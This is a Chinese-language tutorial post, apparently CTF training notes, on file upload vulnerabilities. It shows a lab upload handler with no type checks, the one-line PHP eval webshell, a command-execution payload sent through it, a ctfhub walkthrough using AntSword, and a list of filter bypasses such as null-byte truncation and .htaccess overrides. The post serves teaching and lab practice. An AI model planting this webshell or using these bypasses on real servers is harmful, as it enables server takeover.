---
title: 文件上传
date: 2025-12-02 19:33:09
tags: 文件上传
---

# 文件上传

## 1.什么是文件上传漏洞

文件上传漏洞实际是因为开发者对于用户文件上传部分的控制不足或者处理缺陷，从而导致了用户可以越过自身有的权限向服务器上传**可执行**的动态脚本文件（前提是服务器会执行），这里的文件可以是木马，病毒，恶意脚本或者webshell等等。这个漏洞的问题本身不在于文件上传，而是文件上传之后服务器怎么处理，解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重后果。

#### 造成该漏洞的原因及原理

原因：

1.对于上传文件的后缀名没有严格过滤

2.对于文件头，二进制内容等等，用于描述文件类型的表述方法没有做检查

3.没有对文件做不可执行的权限的处理

原理：

在web中上传文件的原理是通过将表单设置为multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上。

#### HTML表单文件上传机制 

##### 1.1 表单文件上传基础

在Web应用中，文件上传是一种常见的用户交互形式，允许用户通过表单上传文件到服务器。HTML表单提供了 <input type="file"> 元素，让用户可以选择文件进行上传。一旦用户选择了一个或多个文件，这些文件将被包含在表单数据中，并通过POST方法提交至服务器指定的处理脚本。

##### 1.2 表单结构和提交机制

一个典型的文件上传表单结构如下：

    <form action="/upload" method="post" enctype="multipart/form-data">
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" value="Upload File" name="submit">
    </form>

html

在这个表单中， enctype 属性设置为 multipart/form-data 是必须的，因为这是处理文件上传的正确编码类型。表单提交后，文件数据会被分割成多个部分，每个部分对应一个表单控件。 

##### 1.3上传过程

前端(可能会有检查限制)->二进制流（这里会发生服务器端的检查也就是检查文件内容进行进一步的限制）->服务器解析->储存到服务器的相应位置

访问时由于大部分网站会配置php解释器所以在访问.php文件的时候.php文件会被执行。

**用大家建的sqli-lab网站进行说明**

简单的上传页面（保存为.html文件）保存在大家建站的目录底下

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="upload.php" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

服务器端处理文件的代码：保存为upload.php注意上头的连接上传到的就是我们的upload.php进行服务器端的处理创建文件夹等等

```
<?php
// 1. 设置上传目录
$uploadDir = 'uploads/';

// 2. 创建目录（如果不存在）
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

// 3. 获取上传的文件信息
$fileName = $_FILES['file']['name'];      // 原始文件名
$tmpName = $_FILES['file']['tmp_name'];   // 临时文件路径
$fileSize = $_FILES['file']['size'];      // 文件大小
$fileError = $_FILES['file']['error'];    // 错误代码

// 4. 检查是否有上传错误
if ($fileError !== 0) {
    die("上传失败，错误代码: $fileError");
}

// 5. 生成安全的文件名（防止中文乱码和重复）
$safeFileName = time() . '_' . preg_replace('/[^a-zA-Z0-9\.]/', '_', $fileName);

// 6. 移动文件到目标目录
$destination = $uploadDir . $safeFileName;

if (move_uploaded_file($tmpName, $destination)) {
    echo "<h3>success</h3>";
    echo "name: " . $fileName . "<br>";
    echo "size: " . round($fileSize / 1024, 2) . " KB<br>";
    echo "<a href='$destination'>dowload</a><br><br>";
    echo "<a href='index.html'>return</a>";
} else {
    echo "false！";
}
?>
```

<img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203202833936.png" alt="image-20251203202833936" style="zoom:80%;" />

打开准备上传即可。

## 2.我们要上传些什么？一句话木马登场~

#### 木马是什么？

计算机木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。 
木马程序表面上是无害的，甚至对没有警戒的用户还颇有吸引力，它们经常隐藏在游戏或图形软件中，但它们却隐藏着恶意。这些表面上看似友善的程序运行后，就会进行一些非法的行动，如删除文件或对硬盘格式化。 
完整的木马程序一般由两部分组成：一个是服务器端，一个是控制器端。“中了木马”就是指安装了木马的服务器端程序，若你的电脑被安装了服务器端程序，则拥有相应客户端的人就可以通过网络控制你的电脑。为所欲为。这时你电脑上的各种文件、程序，以及在你电脑上使用的账号、密码无安全可言了。

#### 一句话木马

```php
<?php @eval($_POST['cmd']);?>
```

这个一句话木马是什么意思呢

它实际上是一个php代码所以它必须写在<?php ?>里面才能被服务器认出来才会被解析执行

@是执行错误也不报错因为我们上传的cmd实际上是一个变量变量没有被定义是用不了的所以会报错，@存在的意义就是让我们的木马能够被正常执行

这句话的意思是什么呢？

我们上传了一个cmd的超全局变量供我们使用，且这个变量是以POST形式接受我们上传的参数的

（网站的参数上传有GET和POST两种方式）

```
  cmd=header("Content-type:text/html;charset=gbk");
  exec("ipconfig",$out);
  echo '<pre>';
  print_r($out);
  echo '</pre>';
```

<img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203200732792.png" alt="image-20251203200732792" style="zoom:80%;" />

![image-20251203200758142](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20251203200758142.png)

这个时候我们就可以通过cmd这个变量去执行任意指令接管计算机了

当然一般情况我们会使用工具去进行连接。

## 3.中国蚁剑

这就是我们会用到的工具

安装及原理：https://blog.csdn.net/hj06112/article/details/150274005

其实原理就是利用上方的cmd变量去执行指令不过这里蚁剑自动帮你把指令输出执行并且把回显结果给返回给你。

![img](https://i-blog.csdnimg.cn/direct/1bbe9d60189f476ba984b928ce091020.png)

## 4.题目演练

ctfhub-文件上传无验证

<img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203192234885.png" alt="image-20251203192234885" style="zoom:80%;" />

游览上传我们写好的php木马

<img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203192258348.png" alt="image-20251203192258348" style="zoom:80%;" />

**<img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203192306945.png" alt="image-20251203192306945" style="zoom:80%;" />**

相对路径

打开蚁剑添加数据

输入上传文件的位置，url

以及我们的木马密码也就是一句话木马里的变量cmd

<img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203192545673.png" alt="image-20251203192545673" style="zoom:80%;" />

<img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203192603287.png" alt="image-20251203192603287" style="zoom:80%;" />

然后找flag即可

<img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203192620035.png" alt="image-20251203192620035" style="zoom:80%;" />

## 一些限制和绕过手段

#### 一.前端限制

#### JavaScript前端文件上传验证

##### 一、基本概念

**JavaScript文件上传验证**是一种**纯前端验证手段**，主要作用是在文件上传到服务器之前，在用户的浏览器中进行初步检查。

##### 二、主要作用

###### 1. **用户体验优化**

- **即时反馈**：用户选择文件后立即得到反馈
- **避免不必要的等待**：在本地就过滤掉明显不合规的文件
- **清晰的错误提示**：直接告诉用户问题所在

###### 2. **减轻服务器负担**

- 过滤掉超大的文件（如超过限制的）
- 过滤掉明显错误的文件类型
- 减少无效请求到服务器

###### 3. **基本安全检查**

- 检查文件扩展名（.jpg/.png等）
- 检查文件大小
- 检查MIME类型

##### 简单绕过方法

###### **1. 禁用JavaScript**

- 浏览器设置中关闭JavaScript
- 使用NoScript等插件

###### **2. 使用BurpSuite等工具**

- 拦截HTTP请求
- 直接修改文件名和内容
- 绕过所有前端检查

### 二、服务端检测绕过

#### 2.1 扩展名检查

**原理**：黑名单/白名单验证文件扩展名
**绕过方法**：

- **IIS6目录解析**：`/.asp/`目录下所有文件按ASP解析
- **IIS6分号漏洞**：`a.asp;jpg`被解析为ASP
- **Windows空格和点**：`a.php.`或`a.php[空格]`存储后去除点和空格
- **Nginx空字节**：`xxx.jpg%00.php`解析为PHP
- **Apache解析**：`a.php.rar`从右向左识别为PHP

#### 2.2 Content-Type检查

**原理**：检查HTTP头中的MIME类型
**绕过方法**：使用BurpSuite修改Content-Type为允许的类型

#### 2.3 文件头检测

**原理**：检查文件头部特征（前10字节）
**绕过方法**：给脚本文件添加对应的文件头

#### 2.4 限制Web服务器行为

**原理**：限制特定目录的脚本执行权限

**绕过方法**：上传`.htaccess`文件覆盖服务器配置

#### 2.5 00截断

**原理**：文件系统遇到`0x00`认为文件结束
**绕过方法**：将文件名如`evil.php.jpg`改为`evil.php%00.jpg`

（绕过方法希望大家能自己去多了解这里不做过多的赘述，培训更多的是想让大家了解漏洞的底层逻辑）